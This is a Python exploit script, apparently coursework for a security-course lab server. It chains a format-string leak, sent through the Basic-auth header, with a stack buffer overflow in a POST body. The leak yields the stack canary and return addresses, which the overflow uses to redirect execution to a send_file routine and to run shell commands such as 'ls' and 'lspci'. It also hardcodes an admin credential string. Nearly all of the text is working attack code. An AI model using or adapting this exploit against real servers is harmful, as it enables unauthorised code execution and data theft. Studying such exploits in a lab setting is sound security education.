

url = "http://project-2.csec.chatzi.org:8000"
pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"


from requests import Request, Session
import base64
import time
import requests


last = None		#teleutaio
semi_last = None	#proteleutaio
canery = None #4o apo to telos
hellooo = None	#trito
hmm = None

def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
			print(int(b))
		else:
			mystring += '%c' % 0x26
			print(0x26)
	return mystring



def set_variables():
	global last
	global semi_last
	global canery
	global hellooo
	global hmm

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	print(response.status_code)
	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	last = int(mystring[-1],16)
	semi_last = int(mystring[-2],16)
	canery = int(mystring[-4],16)
	hellooo = int(mystring[4],16)

	print(mystring[-9])
	hmm = int(mystring[-9],16)

	time.sleep(1)

set_variables()


guessed_address=last - 0xB8	#vale to teleutaio argument 
send_file = hmm - 0x1AA5A0 #vale to proteleutaio argument 
var_c0_value = canery	#vale to 4o apo to telos

#puts 0xf7cefd20


old_ebp = last
old_esi = 0xF7F31000 #####dn paizei kapoio rolo
old_ebx = var_c0_value


shutdown = 0x56556b18	#vres original return address of post_param
print("send_file difference with semi_last")
print(hex(semi_last - send_file))

# "winkwinkwin"

print(hex(guessed_address))



shellcode = "ls&" 

data = shellcode 
data +=  89*"!" 
data += transform_address(guessed_address + 140 + 4)
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address + 2)
data += 4*"-" 
data +=  transform_address(var_c0_value)
data += transform_address(old_ebx) 
data += transform_address(old_esi) 
data += transform_address(old_ebp) 
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data +=  transform_address(guessed_address+152)
data += "lspci > winkwinkwin"
data += '\0'

print(data)
s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = 66
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)


print(response.status_code)
print(response.headers)
print(response.content)

